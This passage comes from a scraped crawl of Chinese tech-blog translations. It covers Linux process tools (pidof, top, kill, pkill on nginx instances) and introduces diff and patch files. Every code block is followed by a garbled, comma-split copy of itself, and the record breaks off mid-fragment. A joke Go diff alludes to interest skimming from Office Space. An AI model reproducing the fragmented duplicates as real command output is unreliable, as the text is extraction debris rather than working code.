,nginx,20520,20521,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,PIDOF,\n,另一个好用的是 ,pidof,。此命令将检查特定二进制文件的 PID，即使另一个同名进程正在运行。为了建立一个例子，我将我的 Nginx 复制到第二个目录，并以相应的路径前缀启动。在现实生活中，这个实例可能位于不同的位置，例如由不同用户拥有的目录。如果我运行两个 Nginx 实例，则,pidof, 输出显示它们的所有进程。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ ps -ef |grep nginx\r\nalan     20881  1454  0 11:18 ?        00:00:00 nginx: master process ./nginx -p /home/alan/web/prod/nginxsec\r\nalan     20882 20881  0 11:18 ?        00:00:00 nginx: worker process\r\nalan     20895  1454  0 11:19 ?        00:00:00 nginx: master process nginx\r\nalan     20896 20895  0 11:19 ?        00:00:00 nginx: worker process,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,ps, ,-,ef, ,|,grep ,nginx,alan, , , , , ,20881, , ,1454, , ,0, ,11,:,18, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,master ,process, ,.,/,nginx, ,-,p, ,/,home,/,alan,/,web,/,prod,/,nginxsec,alan, , , , , ,20882, ,20881, , ,0, ,11,:,18, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,worker ,process,alan, , , , , ,20895, , ,1454, , ,0, ,11,:,19, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,master ,process ,nginx,alan, , , , , ,20896, ,20895, , ,0, ,11,:,19, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,worker ,process,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,grep, 或 ,pgrep, 将显示 PID 数字，但我们可能无法辨别哪个实例是哪个。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ pgrep nginx\r\n20881\r\n20882\r\n20895\r\n20896,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,pgrep ,nginx,20881,20882,20895,20896,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,pidof, 命令可用于确定每个特定 Nginx 实例的 PID。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ pidof /home/alan/web/prod/nginxsec/sbin/nginx\r\n20882 20881\r\n\r\nalan@workstation:~$ pidof /home/alan/web/prod/nginx/sbin/nginx\r\n20896 20895,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,pidof, ,/,home,/,alan,/,web,/,prod,/,nginxsec,/,sbin,/,nginx,20882, ,20881, ,alan,@,workstation,:,~,$, ,pidof, ,/,home,/,alan,/,web,/,prod,/,nginx,/,sbin,/,nginx,20896, ,20895,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,TOP,\n,top, 命令已经有很久的历史了，对于查看运行进程的细节和快速识别内存消耗等问题是非常有用的。其默认视图如下所示。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntop - 11:56:28 up 1 day, 13:37,  1 user,  load average: 0.09, 0.04, 0.03\r\nTasks: 292 total,   3 running, 225 sleeping,   0 stopped,   0 zombie\r\n%Cpu(s):  0.1 us,  0.2 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\r\nKiB Mem : 16387132 total, 10854648 free,  1859036 used,  3673448 buff/cache\r\nKiB Swap:        0 total,        0 free,        0 used. 14176540 avail Mem\r\n\r\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\r\n17270 alan      20   0 3930764 247288  98992 R   0.7  1.5   5:58.22 gnome-shell\r\n20496 alan      20   0  816144  45416  29844 S   0.5  0.3   0:22.16 gnome-terminal-\r\n21110 alan      20   0   41940   3988   3188 R   0.1  0.0   0:00.17 top\r\n    1 root      20   0  225564   9416   6768 S   0.0  0.1   0:10.72 systemd\r\n    2 root      20   0       0      0      0 S   0.0  0.0   0:00.01 kthreadd\r\n    4 root       0 -20       0      0      0 I   0.0  0.0   0:00.00 kworker/0:0H\r\n    6 root       0 -20       0      0      0 I   0.0  0.0   0:00.00 mm_percpu_wq\r\n    7 root      20   0       0      0      0 S   0.0  0.0   0:00.08 ksoftirqd/0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,top, ,-, ,11,:,56,:,28, ,up, ,1, ,day,,, ,13,:,37,,, , ,1, ,user,,, , ,load ,average,:, ,0.09,,, ,0.04,,, ,0.03,Tasks,:, ,292, ,total,,, , , ,3, ,running,,, ,225, ,sleeping,,, , , ,0, ,stopped,,, , , ,0, ,zombie,%,Cpu,(,s,),:, , ,0.1, ,us,,, , ,0.2, ,sy,,, , ,0.0, ,ni,,, ,99.7, ,id,,, , ,0.0, ,wa,,, , ,0.0, ,hi,,, , ,0.0, ,si,,, , ,0.0, ,st, ,KiB ,Mem, ,:, ,16387132, ,total,,, ,10854648, ,free,,, , ,1859036, ,used,,, , ,3673448, ,buff,/,cache,KiB ,Swap,:, , , , , , , , ,0, ,total,,, , , , , , , , ,0, ,free,,, , , , , , , , ,0, ,used,., ,14176540, ,avail ,Mem, , , ,PID ,USER, , , , , , ,PR, , ,NI, , , , ,VIRT, , , , ,RES, , , , ,SHR, ,S, , ,%,CPU, ,%,MEM, , , , , ,TIME,+, ,COMMAND,17270, ,alan, , , , , , ,20, , , ,0, ,3930764, ,247288, , ,98992, ,R, , , ,0.7, , ,1.5, , , ,5,:,58.22, ,gnome,-,shell,20496, ,alan, , , , , , ,20, , , ,0, , ,816144, , ,45416, , ,29844, ,S, , , ,0.5, , ,0.3, , , ,0,:,22.16, ,gnome,-,terminal,-,21110, ,alan, , , , , , ,20, , , ,0, , , ,41940, , , ,3988, , , ,3188, ,R, , , ,0.1, , ,0.0, , , ,0,:,00.17, ,top, , , , ,1, ,root, , , , , , ,20, , , ,0, , ,225564, , , ,9416, , , ,6768, ,S, , , ,0.0, , ,0.1, , , ,0,:,10.72, ,systemd, , , , ,2, ,root, , , , , , ,20, , , ,0, , , , , , , ,0, , , , , , ,0, , , , , , ,0, ,S, , , ,0.0, , ,0.0, , , ,0,:,00.01, ,kthreadd, , , , ,4, ,root, , , , , , , ,0, ,-,20, , , , , , , ,0, , , , , , ,0, , , , , , ,0, ,I, , , ,0.0, , ,0.0, , , ,0,:,00.00, ,kworker,/,0,:,0H, , , , ,6, ,root, , , , , , , ,0, ,-,20, , , , , , , ,0, , , , , , ,0, , , , , , ,0, ,I, , , ,0.0, , ,0.0, , , ,0,:,00.00, ,mm_percpu,_,wq, , , , ,7, ,root, , , , , , ,20, , , ,0, , , , , , , ,0, , , , , , ,0, , , , , , ,0, ,S, , , ,0.0, , ,0.0, , , ,0,:,00.08, ,ksoftirqd,/,0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可以通过键入字母 ,s, 和您喜欢的更新秒数来更改更新间隔。为了更容易监控我们的示例 Nginx 进程，我们可以使用 ,-p, 选项并传递 PID 来调用 ,top,。这个输出要干净得多。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ top -p20881 -p20882 -p20895 -p20896\r\n\r\nTasks:   4 total,   0 running,   4 sleeping,   0 stopped,   0 zombie\r\n%Cpu(s):  2.8 us,  1.3 sy,  0.0 ni, 95.9 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\r\nKiB Mem : 16387132 total, 10856008 free,  1857648 used,  3673476 buff/cache\r\nKiB Swap:        0 total,        0 free,        0 used. 14177928 avail Mem\r\n\r\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\r\n20881 alan      20   0   12016    348      0 S   0.0  0.0   0:00.00 nginx\r\n20882 alan      20   0   12460   1644    932 S   0.0  0.0   0:00.00 nginx\r\n20895 alan      20   0   12016    352      0 S   0.0  0.0   0:00.00 nginx\r\n20896 alan      20   0   12460   1628    912 S   0.0  0.0   0:00.00 nginx,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,top, ,-,p20881, ,-,p20882, ,-,p20895, ,-,p20896, ,Tasks,:, , , ,4, ,total,,, , , ,0, ,running,,, , , ,4, ,sleeping,,, , , ,0, ,stopped,,, , , ,0, ,zombie,%,Cpu,(,s,),:, , ,2.8, ,us,,, , ,1.3, ,sy,,, , ,0.0, ,ni,,, ,95.9, ,id,,, , ,0.0, ,wa,,, , ,0.0, ,hi,,, , ,0.0, ,si,,, , ,0.0, ,st, ,KiB ,Mem, ,:, ,16387132, ,total,,, ,10856008, ,free,,, , ,1857648, ,used,,, , ,3673476, ,buff,/,cache,KiB ,Swap,:, , , , , , , , ,0, ,total,,, , , , , , , , ,0, ,free,,, , , , , , , , ,0, ,used,., ,14177928, ,avail ,Mem, , , ,PID ,USER, , , , , , ,PR, , ,NI, , , , ,VIRT, , , , ,RES, , , , ,SHR, ,S, , ,%,CPU, ,%,MEM, , , , , ,TIME,+, ,COMMAND,20881, ,alan, , , , , , ,20, , , ,0, , , ,12016, , , , ,348, , , , , , ,0, ,S, , , ,0.0, , ,0.0, , , ,0,:,00.00, ,nginx,20882, ,alan, , , , , , ,20, , , ,0, , , ,12460, , , ,1644, , , , ,932, ,S, , , ,0.0, , ,0.0, , , ,0,:,00.00, ,nginx,20895, ,alan, , , , , , ,20, , , ,0, , , ,12016, , , , ,352, , , , , , ,0, ,S, , , ,0.0, , ,0.0, , , ,0,:,00.00, ,nginx,20896, ,alan, , , , , , ,20, , , ,0, , , ,12460, , , ,1628, , , , ,912, ,S, , , ,0.0, , ,0.0, , , ,0,:,00.00, ,nginx,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在管理进程，特别是终止进程时，正确确定 PID 是非常重要。此外，如果以这种方式使用 ,top,，每当这些进程中的一个停止或一个新进程开始时，,top, 都需要被告知有新的进程。,\n,终止进程,\n,KILL,\n,有趣的是，没有 ,stop, 命令。在 Linux 中，有 ,kill, 命令。,kill, 用于向进程发送信号。最常用的信号是“终止”（,SIGTERM,）或“杀死”（,SIGKILL,）。然而，还有更多。下面是一些例子。完整的列表可以用 ,kill -L, 显示。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP\r\n 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1\r\n11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t, ,1,), ,SIGHUP, , , , , , , ,2,), ,SIGINT, , , , , , , ,3,), ,SIGQUIT, , , , , , ,4,), ,SIGILL, , , , , , , ,5,), ,SIGTRAP, ,6,), ,SIGABRT, , , , , , ,7,), ,SIGBUS, , , , , , , ,8,), ,SIGFPE, , , , , , , ,9,), ,SIGKILL, , , , , ,10,), ,SIGUSR1,11,), ,SIGSEGV, , , , , ,12,), ,SIGUSR2, , , , , ,13,), ,SIGPIPE, , , , , ,14,), ,SIGALRM, , , , , ,15,), ,SIGTERM, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,注意第 9 号信号是 ,SIGKILL,，通常，我们会发出比如 ,kill -9 20896, 这样的命令。默认信号是 15，这是 ,SIGTERM,。请记住，许多应用程序都有自己的停止方法。Nginx 使用 ,-s, 选项传递信号，如 ,stop, 或 ,reload,。通常，我更喜欢使用应用程序的特定方法来停止操作。然而，我将演示用 ,kill, 命令来停止 Nginx 进程 20896，然后用 ,pgrep, 确认它已经停止。PID 20896 就不再出现。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ kill -9 20896\r\n \r\nalan@workstation:~$ pgrep nginx\r\n20881\r\n20882\r\n20895\r\n22123,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,kill, ,-,9, ,20896, ,alan,@,workstation,:,~,$, ,pgrep ,nginx,20881,20882,20895,22123,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,PKILL,\n,命令 ,pkill, 类似于 ,pgrep,，因为它可以按名称搜索。这意味着在使用 ,pkill, 时必须非常小心。在我的 Nginx 示例中，如果我只想杀死一个 Nginx 实例，我可能不会选择使用它。我可以将 Nginx 选项 ,-s stop, 传递给特定的实例来消除它，或者我需要使用 ,grep, 来过滤整个 ,ps, 输出。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/home/alan/web/prod/nginx/sbin/nginx -s stop\r\n/home/alan/web/prod/nginxsec/sbin/nginx -s stop,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/,home,/,alan,/,web,/,prod,/,nginx,/,sbin,/,nginx, ,-,s, ,stop,/,home,/,alan,/,web,/,prod,/,nginxsec,/,sbin,/,nginx, ,-,s, ,stop,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果我想使用 ,pkill,，我可以包括 ,-f, 选项，让 ,pkill, 过滤整个命令行参数。这当然也适用于 ,pgrep,。所以，在执行 ,pkill -f, 之前，首先我可以用 ,pgrep -a, 确认一下。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ pgrep -a nginx\r\n20881 nginx: master process ./nginx -p /home/alan/web/prod/nginxsec\r\n20882 nginx: worker process\r\n20895 nginx: master process nginx\r\n20896 nginx: worker process,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,pgrep, ,-,a, ,nginx,20881, ,nginx,:, ,master ,process, ,.,/,nginx, ,-,p, ,/,home,/,alan,/,web,/,prod,/,nginxsec,20882, ,nginx,:, ,worker ,process,20895, ,nginx,:, ,master ,process ,nginx,20896, ,nginx,:, ,worker ,process,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我也可以用 ,pgrep -f, 缩小我的结果。,pkill, 使用相同参数会停止该进程。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ pgrep -f nginxsec\r\n20881\r\n                                           \r\nalan@workstation:~$ pkill -f nginxsec,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,pgrep, ,-,f, ,nginxsec,20881, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,alan,@,workstation,:,~,$, ,pkill, ,-,f, ,nginxsec,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,pgrep,（尤其是 ,pkill,）要记住的关键点是，您必须始终确保搜索结果准确性，这样您就不会无意中影响到错误的进程。,\n,大多数这些命令都有许多命令行选项，所以我总是建议阅读每一个命令的 ,man 手册页,。虽然大多数这些命令都存在于 Linux、Solaris 和 BSD 等平台上，但也有一些不同之处。在命令行工作或编写脚本时，始终测试并随时准备根据需要进行更正。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114393/", "url_object_id": "559175844b39683eecc1d47efb6692d4", "front_image_path": "full/a7d253575f9f762a527f2b1b405c8e65cae34fe9.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/3e2e21811bc26c0e4b76ce72d72cb95b.jpg"], "title": "差异文件（diff）和补丁文件（patch）简介", "create_time": "2018/09/15", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Phil Estes,   译文出处：,Linux中国/DavidChenLiang,   ,\n,如果你曾有机会在一个使用分布式开发模型的大型代码库上工作过，你就应该听说过类似下面的话，“Sue 刚发过来一个补丁patch”，“Rajiv 正在签出checking out差异diff”, 可能这些词（补丁、差异文件）对你而言很陌生，而你确定很想搞懂他们到底指什么。开源软件对上述提到的名词有很大的贡献，作为大型项目从 Apache web 服务器到 Linux 内核的开发模型，“基于补丁文件的开发” 这一模式贯穿了上述项目的始终。实际上，你可能不知道 Apache 的名字就来自“一系列的代码补丁”（LCTT 译注：Apache 英文发音和补丁的英文 patch 相似)，它们被一一收集起来并针对原来的 ,NCSA HTTPd server source code, 进行了修订。,\n,你可能认为这只不过是些逸闻，但是一份早期的 ,Apache 网站的存档中, 声称 Apache 的名字就是来自于最早的“补丁”集合；即“打了补丁的APAtCHy”服务器，简化为 Apache。,\n,好了，言归正传，程序员嘴里说的“差异”和“补丁”到底是什么？,\n,首先，在这篇文章里，我们可以认为这两个术语都指向同一个概念。“diff” 是 ”difference“ 的简写；Unix 下的同名工具程序 ,diff,剖析了一个或多个文件之间的“差异”。下面我们会看到 ,diff, 的例子:,\n,一个“补丁”指的是文件之间一系列差异，这些差异能被 Unix 的 ,diff, 程序应用在源代码树上。我们能使用 ,diff, 工具来创建“差异”（或“补丁”），然后使用该工具将它们 “打” 在一个没有这个补丁的同样的源代码版本上。此外，（我又要开始跑题说些历史轶事了……），“补丁” 这个词真的指在计算机的早期使用打卡机的时候，用来覆盖在打孔纸带上来对软件进行修改的覆盖纸，那个时代打孔纸带就是在计算机处理器上运行的程序。下面来自 ,维基页面, 的这张图真切的描绘了最初的“打补丁”这个词的出处:,\n,\n,现在你对补丁和差异就了一个基本的概念，让我们来看看软件开发者是怎么使用这些工具的。如果你还没有使用过类似于 ,Git, 或 ,subversion, 这样的源代码版本控制工具的话，我将会一步步展示最流行的软件项目是怎么使用它们的。如果你将一个软件的生命周期看成是一条时间线的话，你就能看见这个软件的点滴变化，比如在何时源代码加上了一个功能，在何时源代码修复了一个功能缺陷。我们称这些改变的点为“提交commit”，“提交”这个词被当今最流行的源代码版本管理工具 Git 所使用，当你想检查在一个提交前后的代码变化的话，（或者在许多个提交之间的代码变化），你都可以使用工具来观察文件差异。,\n,如果你同样在使用 Git 开发软件的话，你可以在你的本地开发环境做些希望交给别的开发者的提交，以添加到他们的源代码树中。为了给别的开发者你的提交，一个方法就是创建一个你本地文件的差异文件，然后将这个“补丁”发送给和你工作在同一个源代码树的别的开发者。别的开发者在“打”了你的补丁之后，就能看到在你的代码变树上的变化。,\n,Linux、Git 和 GitHub,\n,这种分享补丁的开发模型正是现今 Linux 内核社区如何处理内核修改提议而采用的模型。如果你有机会浏览任何一个主流的 Linux 内核邮件列表 —— 主要是 ,LKML,，也包括 ,linux-containers,、,fs-devel,、,Netdev, 等等，你能看到很多开发者会贴出他们想让其他内核开发者审核、测试或者合入 Linux 官方 Git 代码树某个位置的补丁。当然，讨论 Git 不在这篇文章范围之内（Git 是由 Linus Torvalds 开发的源代码控制系统，它支持分布式开发模型以及允许独立于主要代码仓库的补丁包，这些补丁包能被推送或拉取到不同的源代码树上，并遵守这些代码树各自的开发流程。）,\n,在继续我们的话题之前，我们当然不能忽略和补丁和差异这个概念相关的最流行的服务：,GitHub,。从它的名字就能猜想出 GitHub 是基于 Git 的，而且它还围绕着 Git 对分布式开源代码开发模型提供了基于 Web 和 API 的工作流管理。（LCTT 译注：即拉取请求Pull Request）。在 GitHub 上，分享补丁的方式不是像 Linux 内核社区那样通过邮件列表，而是通过创建一个 ,拉取请求, 。当你提交你自己的源代码树的改动时，你能通过创建一个针对软件项目的共享仓库的“拉取请求”来分享你的代码改动（LCTT 译注：即核心开发者维护一个主仓库，开发者去“复刻fork”这个仓库，待各自的提交后再创建针对这个主仓库的拉取请求，所有的拉取请求由主仓库的核心开发者批准后才能合入主代码库。）GitHub 被当今很多活跃的开源社区所采用，如 ,Kubernetes,、,Docker,、,容器网络接口 (CNI),、,Istio, 等等。在 GitHub 的世界里，用户会倾向于使用基于 Web 页面的方式来审核一个拉取请求里的补丁或差异，你也可以直接访问原始的补丁并在命令行上直接使用它们。,\n,该说点干货了,\n,我们前面已经讲了在流行的开源社区里是怎么应用补丁和差异的，现在看看一些例子。,\n,第一个例子包括一个源代码树的两个不同副本，其中一个有代码改动，我们想用 ,diff, 来看看这些改动是什么。这个例子里，我们想看的是“合并格式unified”的补丁，这是现在软件开发世界里最通用的格式。如果想知道更详细参数的用法以及如何生成差异文件，请参考 ,diff, 手册。原始的代码在 ,sources-orig, 目录，而改动后的代码在 ,sources-fixed, 目录。如果要在你的命令行上用“合并格式”来展示补丁，请运行如下命令。（LCTT 译注：参数 ,-N, 代表如果比较的文件不存在，则认为是个空文件， ,-a, 代表将所有文件都作为文本文件对待，,-u, 代表使用合并格式并输出上下文，,-r, 代表递归比较目录）,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ diff -Naur sources-orig/ sources-fixed/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,diff, ,-,Naur ,sources,-,orig,/, ,sources,-,fixed,/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,……下面是 ,diff, 命令的输出：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndiff -Naur sources-orig/officespace/interest.go sources-fixed/officespace/interest.go\r\n--- sources-orig/officespace/interest.go        2018-08-10 16:39:11.000000000 -0400\r\n+++ sources-fixed/officespace/interest.go       2018-08-10 16:39:40.000000000 -0400\r\n<a href=\"http://www.jobbole.com/members/weiboyutao1302\">@@</a> -11,15 +11,13 <a href=\"http://www.jobbole.com/members/weiboyutao1302\">@@</a>\r\n   InterestRate float64\r\n }\r\n\r\n+// compute the rounded interest for a transaction\r\n func computeInterest(acct *Account, t Transaction) float64 {\r\n\r\n   interest := t.Amount * t.InterestRate\r\n   roundedInterest := math.Floor(interest*100) / 100.0\r\n   remainingInterest := interest - roundedInterest\r\n\r\n-  // a little extra..\r\n-  remainingInterest *= 1000\r\n-\r\n   // Save the remaining interest into an account we control:\r\n   acct.Balance = acct.Balance + remainingInterest,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,diff, ,-,Naur ,sources,-,orig,/,officespace,/,interest,.,go ,sources,-,fixed,/,officespace,/,interest,.,go,--,-, ,sources,-,orig,/,officespace,/,interest,.,go, , , , , , , , ,2018,-,08,-,10, ,16,:,39,:,11.000000000, ,-,0400,++,+, ,sources,-,fixed,/,officespace,/,interest,.,go, , , , , , , ,2018,-,08,-,10, ,16,:,39,:,40.000000000, ,-,0400,<,a, ,href,=,\"http://www.jobbole.com/members/weiboyutao1302\",>,@,@,<,/,a,>, ,-,11,,,15, ,+,11,,,13, ,<,a, ,href,=,\"http://www.jobbole.com/members/weiboyutao1302\",>,@,@,<,/,a,>, , , ,InterestRate ,float64, ,}, ,+,// compute the rounded interest for a transaction, ,func ,computeInterest,(,acct *,Account,,, ,t, ,Transaction,), ,float64, ,{, , , , ,interest, ,:,=, ,t,.,Amount *, ,t,.,InterestRate, , , ,roundedInterest, ,:,=, ,math,.,Floor,(,interest*,100,), ,/, ,100.0, , , ,remainingInterest, ,:,=, ,interest, ,-, ,roundedInterest, ,-, , ,// a little extra..,-, , ,remainingInterest *,=, ,1000,-, , , ,// Save the remaining interest into an account we control:, , , ,acct,.,Balance, ,=, ,acct,.,Balance, ,+, ,remainingInterest,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,最开始几行 ,diff, 命令的输出可以这样解释：三个 ,---, 显示了原来文件的名字；任何在原文件（LCTT 译注：不是源文件）里存在而在新文件里不存在的行将会用前缀 ,-,，用来表示这些行被从源代码里“减去”了。而 ,+++, 表示的则相反：在新文件里被加上的行会被放上前缀 ,+,，表示这是在新文件里被“加上”的行。补丁文件中的每一个补丁“块”（用 ,@@, 作为前缀的的部分）都有上下文的行号，这能帮助补丁工具（或其它处理器）知道在代码的哪里应用这个补丁块。你能看到我们已经修改了“Office Space”这部电影里提到的那个函数（移除了三行并加上了一行代码注释），电影里那个有点贪心的工程师可是偷偷的在计算利息的函数里加了点“料”哦。（LCTT译注：剧情详情请见电影 ,https://movie.douban.com/subject/1296424/）,\n,如果你想找人来测试你的代码改动，你可以将差异保存到一个补丁里：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ diff -Naur sources-orig/ sources-fixed/ >myfixes.patch,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,diff, ,-,Naur ,sources,-,orig,/, ,sources,-,fixed,/, ,>,myfixes,.,patch,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在你有补丁 ,myfixes.patch, 了，你能把它分享给别的开发者，他们可以将这个补丁打在他们自己的源代码树上从而得到和你一样的代码并测试他们。如果一个开发者的当前工作目录就是他的源代码树的根的话，他可以用下面的命令来打补丁：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ patch -p1 < ../myfixes.patch\r\npatching file officespace/interest.go,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,patch, ,-,p1, ,<, ,.,.,/,myfixes,.,patch,patching ,file ,officespace,/,interest,.,go,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在这个开发者的源代码树已经打好补丁并准备好构建和测试文件的修改了。那么如果这个开发者在打补丁之前已经改动过了怎么办？只要这些改动没有直接冲突（LCTT 译注：比如改在同一行上），补丁工具就能自动的合并代码的改动。例如下面的interest.go 文件，它有其它几处改动，然后它想打上 ,myfixes.patch, 这个补丁：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ patch -p1 < ../myfixes.patch\r\npatching file officespace/interest.go\r\nHunk #1 succeeded at 26 (offset 15 lines).,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,patch, ,-,p1, ,<, 